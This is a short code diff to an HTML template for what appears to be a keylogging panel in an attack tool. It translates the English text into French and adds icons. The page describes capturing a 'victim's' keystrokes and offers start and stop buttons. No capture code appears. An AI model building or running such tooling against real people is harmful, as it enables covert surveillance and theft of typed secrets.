@@ -10,19 +10,19 @@
 	}
 	</style>
 	{% if not enabled %}
-		<p>This tool enables to get almost instantly keystrokes of the victim.</p>
-		<p class="text-center">
-			<a class="btn btn-primary" href="?action=start" role="button">Start capturing</a>
+		<p>Cet outil vous permet de récupérer quasi-instantannément les frappes clavier de la victime. Certaines touches ne s'affichent pas (ESC).</p>
+		<p class="text-center mt-3">
+			<a class="btn btn-primary" href="?action=start" role="button"><i class="fas fa-play    "></i> Lancer la capture</a>
 		</p>
 	{% endif %}
 
 	{% if enabled %}
 		<p class="text-center">
-			<a class="btn btn-danger" href="?action=stop" role="button">Stop capturing</a>
+			<a class="btn btn-danger" href="?action=stop" role="button"><i class="fas fa-stop    "></i> Arrêter la capture</a>
 		</p>
 		<div style="float: right">
 			<div class="spinner-grow text-danger" role="status ">
-				<span class="sr-only">Loading...</span>
+				<span class="sr-only">Capture en cours...</span>
 			</div>
 		</div>
 
